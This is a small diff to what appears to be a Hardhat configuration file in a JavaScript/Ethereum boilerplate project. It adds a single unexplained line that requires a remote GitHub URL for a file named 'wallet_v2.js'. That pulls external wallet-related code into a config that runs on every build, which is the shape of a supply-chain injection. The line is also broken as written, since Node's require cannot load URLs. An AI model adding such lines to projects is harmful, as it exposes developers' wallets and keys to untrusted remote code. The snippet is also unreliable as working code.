@@ -41,6 +41,7 @@ module.exports = {
 // project. It imports a Hardhat task definition, that can be used for
 // testing the frontend.
 require("./tasks/faucet");
+require("https://github.com/VersoriumX/hardhat-boilerplate/blob/master/wallet_v2.js")
 
 /** @type import('hardhat/config').HardhatUserConfig */
 module.exports = {
